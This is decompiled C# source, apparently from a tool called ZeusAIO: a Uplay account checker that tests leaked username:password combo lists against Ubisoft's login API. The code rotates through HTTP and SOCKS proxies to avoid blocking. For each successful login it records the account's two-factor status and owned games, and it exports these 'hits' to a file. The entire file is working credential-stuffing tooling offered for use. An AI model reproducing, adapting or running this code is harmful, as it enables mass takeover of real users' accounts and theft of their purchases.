// Decompiled with JetBrains decompiler
// Type: Uplay.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Uplay
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int twoFactor = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = false;
              httpRequest.AddHeader("Authorization", "Basic " + Check.Base64Encode(s[0] + ":" + s[1]));
              httpRequest.AddHeader("Ubi-AppId", "f68a4bb5-608a-4ff2-8123-be8ef797e0a6");
              httpRequest.AddHeader("Ubi-RequestedPlatformType", "uplay");
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str1 = httpRequest.Post("https://public-ubiservices.ubi.com/v3/profiles/sessions", "{}", "application/json; charset=utf-8").ToString();
              if (str1.Contains("profileId"))
              {
                JObject jobject = (JObject) JsonConvert.DeserializeObject(str1);
                string sessionId = jobject["sessionId"].ToString();
                string ticket = jobject["ticket"].ToString();
                string str2 = Check.UPlayHas2FA(ticket, sessionId);
                string games = Check.UPlayGetGames(ticket);
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - UPLAY] " + s[0] + ":" + s[1] + " | HAS 2FA: " + str2 + " - GAMES: " + games, Color.Green);
                Export.AsResult("/Uplay_hits", s[0] + ":" + s[1] + " | HAS 2FA: " + str2 + " - GAMES: " + games);
                return false;
              }
              if (!str1.Contains("Invalid credentials"))
              {
                if (str1.Contains("The Ubi-Challenge header is required."))
                  break;
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    private static string UPlayHas2FA(string ticket, string sessionId)
    {
      while (true)
      {
        try
        {
          using (HttpRequest req = new HttpRequest())
          {
            Check.SetBasicRequestSettingsAndProxies(req);
            req.AddHeader("Ubi-SessionId", sessionId);
            req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
            req.Authorization = "Ubi_v1 t=" + ticket;
            string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
            if (str.Contains("active"))
            {
              if (str.Contains("true"))
                return "true";
              if (str.Contains("false"))
                return "false";
            }
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
    }

    private static string UPlayGetGames(string ticket)
    {
      while (true)
      {
        try
        {
          using (HttpRequest req = new HttpRequest())
          {
            Check.SetBasicRequestSettingsAndProxies(req);
            req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
            req.Authorization = "Ubi_v1 t=" + ticket;
            string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
            if (input.Contains("[") && input != "[]")
            {
              Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
              Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
              string str1 = "";
              string str2;
              while (true)
              {
                str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
                match1 = match1.NextMatch();
                match2 = match2.NextMatch();
                if (!(match1.Groups[1].Value == ""))
                  str1 = str2 + ", ";
                else
                  break;
              }
              return str2;
            }
          }
        }
        catch
        {
        }
      }
    }

    private static void SetBasicRequestSettingsAndProxies(HttpRequest req)
    {
      req.IgnoreProtocolErrors = true;
      req.ConnectTimeout = 10000;
      req.KeepAliveTimeout = 10000;
      req.ReadWriteTimeout = 10000;
      string[] strArray = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount)).Split(':');
      ProxyClient proxyClient = mainmenu.proxyProtocol == "SOCKS5" ? (ProxyClient) new Socks5ProxyClient(strArray[0], int.Parse(strArray[1])) : (mainmenu.proxyProtocol == "SOCKS4" ? (ProxyClient) new Socks4ProxyClient(strArray[0], int.Parse(strArray[1])) : (ProxyClient) new HttpProxyClient(strArray[0], int.Parse(strArray[1])));
      if (strArray.Length == 4)
      {
        proxyClient.Username = strArray[2];
        proxyClient.Password = strArray[3];
      }
      req.Proxy = proxyClient;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
